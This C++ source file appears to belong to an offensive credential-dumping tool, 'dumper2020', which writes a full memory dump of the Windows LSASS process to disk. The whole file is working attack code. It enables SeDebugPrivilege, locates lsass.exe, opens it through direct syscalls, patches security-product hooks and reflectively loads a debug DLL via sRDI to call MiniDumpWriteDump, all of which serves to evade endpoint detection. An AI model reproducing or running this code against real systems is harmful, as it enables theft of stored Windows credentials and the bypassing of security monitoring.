#include "dumper2020.h"
#include "whisper.h"
#include "proto.h"
#include "hooks.h"
#include "srdi.h"
#include <iostream>
using namespace std;

// Global RTL functions
fnRtlInitUnicodeString RtlInitUnicodeString;
fnRtlEqualUnicodeString RtlEqualUnicodeString;
fnRtlGetVersion RtlGetVersion;

// Function:    Dump
// Description: Dump LSASS process memory to disk
// Arguments:   Wide char array containing dump file path
// Called from: main/DllMain
// Returns:     True if dump was successful
BOOL Dump(const wchar_t* wcDumpPath)
{
    // Check requirements before anything else
    if (!Requirements())
        return FALSE;

    // Resolve RTL functions
    if (!ResolveHelpers())
        return FALSE;

    // Patch hooks as needed
    PatchHooks();

    HANDLE hDump = NULL;    // Handle to dump file
    HANDLE hLsass = NULL;   // Handle to LSASS process
    DWORD dwPid = 0;        // LSASS PID
    BOOL bStatus = FALSE;   // Status of dump

    // Create destination file
    if ((hDump = CreateDumpFile(wcDumpPath)) != NULL) {

        // Get LSASS PID
        if ((dwPid = GetPid()) > 0) {

            // Open LSASS
            if ((hLsass = GetHandle(dwPid)) != NULL) {

                wcout << "[+] Successfully opened LSASS, PID: " << dwPid << endl;

                // Use sRDI to load debug DLL
                HMODULE hDebugDLL = LoadDLL(GetDebugDLLPath().data());

                if (hDebugDLL) {
                    // sRDI successful, get MiniDumpWriteDump function pointer
                    fnMiniDumpWriteDump MiniDumpWriteDump = (fnMiniDumpWriteDump)GetProcAddressR(hDebugDLL, "MiniDumpWriteDump");

                    if (MiniDumpWriteDump) {

                        wcout << "[+] Dumping to: " << wcDumpPath << endl;

                        // Perform the dump
                        bStatus = MiniDumpWriteDump(hLsass, dwPid, hDump, MiniDumpWithFullMemory, NULL, NULL, NULL);

                        if (!bStatus)
                            wcout << "[!] Dump failed: " << GetLastError() << endl;
                        else
                            wcout << "[+] Dump complete" << endl;
                    
                    }
                    else wcout << "[!] Failed to locate MiniDumpWriteDump function" << endl;
                }
                else wcout << "[!] Failed to perform sRDI" << endl;
            }
            else wcout << "[!] Failed to open LSASS" << endl;
        }
        else wcout << "[!] Failed to locate LSASS PID" << endl;
    } 
    else {
        wcout << "[!] Failed to create dump file" << endl;
        return FALSE;
    }

    // Close handles as needed
    if (hLsass) NtClose(hLsass);
    if (hDump) NtClose(hDump);

    if (!bStatus)
        // Dump failed, attempt to clean up
        if (DeleteDumpFile(wcDumpPath))
            wcout << "[+] Removed dump file" << endl;
        else
            wcout << "[!] Failed to remove dump file" << endl;

    return bStatus;
}

// Function:    Requirements
// Description: Verify 64-bit architecture, elevated context, and SeDebugPrivilege (enable as needed)
// Called from: Dump
// Returns:     True if all requirements are met, false if any are not
BOOL Requirements()
{
    // 64-bit only
    if (sizeof(LPVOID) != 8) {
        wcout << "[!] 64-bit architecture only" << endl;
        return FALSE;
    }

    HANDLE hToken = NULL; // Process token handle

    // Open our token
    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken) == 0) {

        TOKEN_ELEVATION Elevation = { 0 };      // Struct for elevation info
        DWORD dwSize = sizeof(TOKEN_ELEVATION); // Size of struct

        // Get token elevation status
        if (NtQueryInformationToken(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize) == 0) {
            
            if (!Elevation.TokenIsElevated) {
                // Token is not elevated
                wcout << "[!] Administrative privileges required" << endl;
                return FALSE;
            }
        }
        else return FALSE;
    } 
    else return FALSE;

    DWORD dwSize = 0; // Size needed for token privilege struct

    // Get size of current privilege array
    if (NtQueryInformationToken(hToken, TokenPrivileges, NULL, NULL, &dwSize) != 0xC0000023)
        return FALSE;
    
    // Allocate memory to store current token privileges
    LPBYTE lpBuffer = new BYTE[dwSize];

    // Sanity check buffer allocation
    if (!lpBuffer)
        return FALSE;

    BOOL bMet = FALSE; // Requirements met?

    // Get current token privileges
    if (NtQueryInformationToken(hToken, TokenPrivileges, lpBuffer, dwSize, &dwSize) == 0) {

        // Assign struct pointer to buffer
        PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)lpBuffer;

        // Loop through privileges assigned to token to find SeDebugPrivilege
        for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
            
            // SeDebugPrivilege LUID = 0x14
            if (pTokenPrivs->Privileges[i].Luid.LowPart == 0x14) {
                
                // Located SeDebugPrivilege, enable it
                pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

                // Apply updated privilege struct to token
                if (NtAdjustPrivilegesToken(hToken, FALSE, pTokenPrivs, dwSize, NULL, NULL) == 0) {
                    
                    // Should be good to go
                    bMet = TRUE;
                }
            }
        }

        if (!bMet)
            wcout << "[!] Token does not have SeDebugPrivilege" << endl;
    }

    // Free buffer
    if (lpBuffer)
        delete lpBuffer;

    // Close token handle
    if (hToken)
        NtClose(hToken);

    return bMet;
}

// Function:    ResolveHelpers
// Description: Resolve addresses for RTL helper/utility functions exported by NTDLL
// Called from: Dump
// Returns:     True if all functions are resolved, false if any are not
BOOL ResolveHelpers()
{
    // NTDLL handle
    HMODULE hNTDLL = GetModuleHandle(L"ntdll.dll");

    // Get function pointers
    RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
    RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(hNTDLL, "RtlEqualUnicodeString");
    RtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNTDLL, "RtlGetVersion");

    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !RtlGetVersion)
        return FALSE;
    else
        return TRUE;
}

// Function:    GetPid
// Description: Get PID for lsass.exe
// Called from: Dump
// Returns:     PID, 0 on failure
DWORD GetPid()
{
    ULONG ulSize = 0;                       // Size of process table
    HANDLE hProcess = GetCurrentProcess();  // Handle to local process
    HANDLE hHeap = GetProcessHeap();        // Handle to local heap

    // Get size of the process table
    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ulSize) != 0xC0000004)
        // Expecting specific STATUS_INFO_LENGTH_MISMATCH status
        return 0;

    // Allocate memory to store process table
    LPVOID lpBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSize);

    // Verify allocation was successful
    if (!lpBuffer)
        return 0;

    // Get process information
    if (NtQuerySystemInformation(SystemProcessInformation, lpBuffer, ulSize, &ulSize) < 0) {
        // Failed for some reason, clean up and return
        if (lpBuffer)
            HeapFree(hHeap, NULL, lpBuffer);
        return 0;
    }

    DWORD dwPid = 0; // PID

    // Create process info struct from buffer
    PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)lpBuffer;

    // Create unicode string
    UNICODE_STRING usLsass;
    RtlInitUnicodeString(&usLsass, L"lsass.exe");

    // Loop through processes until lsass.exe is found
    while (pProcInfo->NextEntryDelta) {
        if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &usLsass, TRUE)) {
            // Found lsass.exe, capture the PID
            dwPid = HandleToUlong(pProcInfo->ProcessId);
            break;
        }
        pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
    }

    // Free buffer
    if (lpBuffer)
        HeapFree(hHeap, NULL, lpBuffer);

    return dwPid;
}

// Function:    GetHandle
// Description: Open handle to the target process with minimum rights needed to perform a memory dump
// Arguments:   Target process PID
// Called from: Dump
// Returns:     Handle to target process, NULL on failure
HANDLE GetHandle(DWORD dwPid)
{
    // Initialize client ID and object attributes
    CLIENT_ID cid = { UlongToHandle(dwPid), NULL };
    OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL };

    // Open the process
    HANDLE hProcess = NULL;
    NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);

    // Return handle
    return hProcess;
}

// Function:    GetDebugDLLPath
// Description: Construct path to DLL exporting MiniDumpWriteDump based on Windows version
// Called from: Dump
// Returns:     Path to debug DLL
string GetDebugDLLPath()
{
    // Get system directory, e.g. c:\windows\system32
    CHAR systemDir[MAX_PATH];
    UINT size = GetSystemDirectoryA(systemDir, MAX_PATH);

    // Initialize string with system directory
    string sPath(systemDir, size);
    
    sPath += "\\"; // Append slash
    
    // Append appropriate DLL name
    if (GetWinVersion() == 10)
        // Use dbgcore.dll with Windows 10
        sPath += "dbgcore.dll";
    else
        // Use dbghelp.dll for everything else
        sPath += "dbghelp.dll";

    return sPath;
}

// Function:    CreateDumpFile
// Description: Create dump file at specified location
// Arguments:   Wide char array containing destination file path
// Called from: Dump
// Returns:     Handle to dump file, NULL on failure
HANDLE CreateDumpFile(const wchar_t* wcDumpPath)
{
    // Path to dump file in NT format
    wstring sDumpPath(L"\\??\\");
    sDumpPath += wcDumpPath;

    // Convert path wide string to unicode string
    UNICODE_STRING usDumpPath;
    RtlInitUnicodeString(&usDumpPath, sDumpPath.data());

    // File handle and structs
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK IoStatusBlock;
    SecureZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
    OBJECT_ATTRIBUTES FileObjectAttributes;
    InitializeObjectAttributes(&FileObjectAttributes, &usDumpPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Create dump file
    NtCreateFile(&hFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0, FILE_ATTRIBUTE_NORMAL,
                    FILE_SHARE_WRITE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    // Return handle
    return hFile;
}

// Function:    DeleteDumpFile
// Description: Delete dump file
// Arguments:   Wide char array containing path to file to delete
// Called from: Dump
// Returns:     True on success
BOOL DeleteDumpFile(const wchar_t* wcDumpPath)
{
    // Path to dump file in NT format
    wstring sDumpPath(L"\\??\\");
    sDumpPath += wcDumpPath;

    // Convert path wide string to unicode string
    UNICODE_STRING usDumpPath;
    RtlInitUnicodeString(&usDumpPath, sDumpPath.data());

    // File object attributes
    OBJECT_ATTRIBUTES FileObjectAttributes;
    InitializeObjectAttributes(&FileObjectAttributes, &usDumpPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Delete dump file
    if (NtDeleteFile(&FileObjectAttributes) != 0)
        // Failed to delete file
        return FALSE;
    else
        // File deleted
        return TRUE;
}

// Function:    GetWinVersion
// Description: Get Windows major version
// Called from: GetDebugDLLPath
// Returns:     Major version, e.g. 5, 6, 10
DWORD GetWinVersion()
{
    RTL_OSVERSIONINFOEXW osVers = { 0 };
    osVers.dwOSVersionInfoSize = sizeof(osVers);

    RtlGetVersion(&osVers);

    return osVers.dwMajorVersion;
}